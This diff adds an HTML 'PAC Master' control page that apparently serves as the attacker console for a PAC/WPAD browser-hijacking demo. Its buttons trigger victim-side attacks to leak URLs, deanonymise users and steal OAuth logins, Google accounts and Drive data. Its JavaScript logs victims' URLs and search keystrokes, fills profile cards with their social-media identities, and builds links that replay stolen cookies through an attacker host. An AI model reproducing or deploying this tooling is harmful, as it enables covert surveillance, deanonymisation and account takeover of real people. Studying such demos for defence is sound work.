@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<!--
+  This is the web page used to launch attacks on the 'victim' browsers. 
+  Each button launches a different demo.
+  
+  All the logic is actually handled by JavaScript in the victim browser. This 
+  page simply receives and displays the data.
+-->
+<head>
+<title>PAC Master</title>
+<link rel="stylesheet" href="pacmaster.css">
+</head>
+<body>
+
+<h1>PAC Master</h1>
+
+<div class="buttons">
+    Nifty Demos: 
+    <button onclick="pac.victimMsg('call', {fn:'pac.resetPacState'})" title="Leak all URLs">1</button>
+    <button onclick="pac.victimMsg('call', {fn:'deanonymise'})" title="Deanonymise">2</button>
+    <button onclick="pac.victimMsg('call', {fn:'stealOauth'})" title="Steal OAuth">3</button>
+    <button onclick="pac.victimMsg('call', {fn:'stealGoogleAccount'})" title="Steal Google Accounts">4</button>
+    <button onclick="pac.victimMsg('call', {fn:'stealGDrive'})" title="Steal Google Drive">5</button>
+</div>
+
+<div id="top">
+    <div id="monitor"></div>
+</div>
+
+<div id="bottom">
+    <h3>All Leaked URLs</h3>
+    <div id="urllog"></div>
+</div>
+
+
+<script src="/static/eventsource.js"></script> <!-- eventsource polyfill for IE -->
+<script src="/wpad.dat?notapacrequest"></script>
+<script src="/static/pacserver.js"></script>
+<script>
+var pac = new PACServer('/subscribe?master');
+pac.addCallback('url', handleUrl);
+pac.addCallback('pac_sessions', updateSessions);
+pac.addCallback('show_url', showUrl);
+pac.addCallback('oauth', handleOauth);
+pac.addCallback('denonymise', handleDeanonymise);
+
+var pac_sessions = {};
+
+var search = [
+    ['Google Search', /^https?:\/\/www\.google\.[^\/]+\/(?:search|gen_204)?.*[&?]q=([^&]+)/],
+    ['Google Click', /^https?:\/\/www\.google\.[^\/]+\/url?.*[&?]url=([^&]+)/]
+];
+
+var typingRegexes = [
+    ['Google Search', /^https?:\/\/www\.google\.[^\/]+\/complete\/search?.*[&?]q=([^&]+)/]
+];
+
+var ignoreTypes = /\.(gif|js|ico|png|jpeg|jpg|svg|woff|woff2|css|mp4m)$/i;
+
+// domains to show for demo
+var matchHosts = [
+    'arstechnica.com',
+    'arstechnica.co.uk',
+    'en.wikipedia.org',
+    'www.bbc.co.uk',
+    'www.reddit.com',
+    'www.contextis.com',
+    'www.defcon.org',
+    'forum.defcon.org',
+    'twitter.com',
+    'www.blackhat.com'
+];
+
+var recentUrls = [];
+
+function showUrl(pac, data) {
+    var a = document.createElement('a');
+    a.textContent = data.msg.linktext;
+    a.setAttribute('href', data.msg.href);
+    a.setAttribute('target', '_blank');
+    var el = document.createElement('div');
+    var text = document.createElement('b');
+    text.textContent = data.msg.title + ': ';
+    el.appendChild(text);
+    el.appendChild(a);
+    addChild(monitor, el);;
+}
+
+var monitor = document.getElementById('monitor');
+var currentTypebox = null;
+
+function handleOauth(pac, data) {
+    oauthdata = data.msg;
+    container = document.createElement('div');
+    link = document.createElement('a');
+    link.setAttribute('href', "http://oauthint." + oauthdata.name + ":8081/util/redirect?url=" + escape(oauthdata.url).replace(/\+/g, "%2b") + "&cookies=" + JSON.stringify(oauthdata.cookies) + "&domain=" + oauthdata.domain);
+    link.textContent = oauthdata.name;
+    text = document.createElement('b');
+    text.textContent = "Got OAuth Login: ";
+    container.appendChild(text);
+    container.appendChild(link);
+    addChild(monitor, container);
+    currentTypebox = null;
+}
+
+function getTemplate(name, id) {
+    var d = document.querySelector('[id="' + name + '-' + id + '"');
+    if (d) return d;
+    var template = document.querySelector('#templates [data-template="' + name +'"]');
+    if (!template) { 
+        console.log("template not found: " + name);
+        return;
+    }
+    d = document.createElement('div')
+    d.setAttribute('id', name + '-' + id);
+    d.setAttribute('class', 'account');
+    d.innerHTML = template.innerHTML;
+    addChild(monitor, d);
+    currentTypebox = null;
+    return d;
+}
+
+function handleDeanonymise(pac, data) {
+    console.log(data.msg);
+    var t = getTemplate(data.msg.service, data.pac_sid);
+    //console.log(t);
+    if (data.msg.attribute == 'photourl') {
+        var el = getTemplateField(t, 'photos');
+        var img = new Image();
+        img.src = data.msg.value;
+        img.width=50;
+        addChild(el, img);
+    } else {
+        setTemplateField(t, data.msg.attribute, data.msg.value);
+    }
+}
+
+function getTemplateField(templ, f) {
+    return templ.querySelector('[data-attr=' + f +']');
+}
+function setTemplateField(templ, f, val) {
+    var el = templ.querySelector('[data-attr=' + f +']');
+    if (!el) {
+        console.log("template field " + f + " not found");
+        return;
+    }
+    if (el.nodeName == 'IMG')
+        el.src = val;
+    else
+        el.textContent = val;
+}
+
+var urllogrecentUrls = [];
+
+function handleUrl(pac, data) {
+    var urllog = document.getElementById('urllog');
+   
+    var ua = '';
+    if (data.pac_sid in pac_sessions)
+        ua = pac_sessions[data.pac_sid].user_agent;
+    var url = data.data;
+   
+    if (urllogrecentUrls.length > 20) urllogrecentUrls.shift();
+    if (urllogrecentUrls.indexOf(url) == -1) {
+        urllogrecentUrls.push(url);
+        var d = document.createElement('div');
+        d.textContent = url;
+        d.setAttribute('title', ua + ' ' + data.pac_sid);
+        if (url.indexOf('https') == 0)
+            d.setAttribute('class', 'https');
+        addChild(urllog, d, 300);
+    }
+   
+    for (var i=0; i<typingRegexes.length; i++) {
+        var k = typingRegexes[i][0];
+        var regex = typingRegexes[i][1];
+        var result = url.match(regex);
+        if (result) {
+            //console.log('type', k, result);
+            if (!currentTypebox) {
+                console.log("creating new typebox");
+                currentTypebox = document.createElement('div');
+                currentTypebox.className = 'typebox';
+                addChild(monitor, currentTypebox)
+            }
+            console.log("updating typebox");
+            var searchTerm = unescape(result[1]).replace(/\+/g, ' ');
+            currentTypebox.innerHTML = '<b>' + k + ':</b> <span>' + searchTerm + '</span>';
+            return;
+        }
+    }
+    for (var i=0; i<search.length; i++) {
+        var k = search[i][0];
+        var regex = search[i][1];
+        var result = url.match(regex);
+        if (result) {
+            var searchTerm = unescape(result[1]).replace(/\+/g, ' ');
+            var text = '<b>' + k + ':</b> <span>' + searchTerm + '</span>';
+            if (currentTypebox) {
+                console.log("updating typebox with final search:" + text);
+                currentTypebox.innerHTML = text;
+                currentTypebox = null;
+            } else {
+                console.log("creating div for final search: " + text);
+                var el = document.createElement('div');
+                el.className = 'search';
+                el.innerHTML = text;
+                addChild(monitor, el);
+            }
+            return;
+        }
+    }
+
+    if (url.indexOf('?') == -1 && url.split('/').length > 2) {
+        var u = new URL(url);
+        if (matchHosts.indexOf(u.host) < 0) return;
+        if (url.match(ignoreTypes)) return;
+        if (recentUrls.indexOf(url) >= 0) return;
+        recentUrls.push(url);
+        if (recentUrls.length > 3) recentUrls.shift();
+        var el = document.createElement('div');
+        el.innerHTML = '<b>Page Visit:</b> ' + url;
+        el.className = 'url';
+        addChild(monitor, el);
+        currentTypebox = null;
+    }
+}
+
+function updateSessions(pac, data) {
+    pac_sessions = data.sessions;
+    console.log("Updated PAC sessions ", pac_sessions);
+}
+
+function addChild(container, el, max) {
+    container.insertBefore(el, container.firstElementChild);
+
+    if (max > 0 && container.childElementCount > max)
+        container.removeChild(container.lastElementChild);
+}
+</script>
+
+<div id="templates">
+    <div data-template="google.com">
+        <span class="google logo"></span>
+        <b>Name:</b> <span data-attr="name"></span> <img data-attr="profileimg" ><br>
+        <b>Google ID:</b> <span data-attr="id"></span><br>
+        <div data-attr="photos" class="photos"></div>
+    </div>
+
+    <div data-template="twitter.com">
+        <span class="twitter"></span>
+        
+        <b>Twitter ID:</b> @<span data-attr="id"></span>
+        <img data-attr="profileimg">
+    </div>
+
+    <div data-template="github.com">
+        <span class="github logo"></span>
+        <b>Github ID:</b> <span data-attr="id"></span>
+    </div>
+
+    <div data-template="linkedin.com">
+        <span class="linkedin logo"></span>
+
+        <b>LinkedIn ID:</b> <span data-attr="id"></span><br>
+        <b>Employment:</b> <span data-attr="employment"></span>
+    </div>
+
+    <div data-template="facebook.com">
+        <span class="facebook logo"></span>
+        <b>Facebook ID:</b> <span data-attr="id"></span>
+    </div>
+</div>
+</body>
+</html>
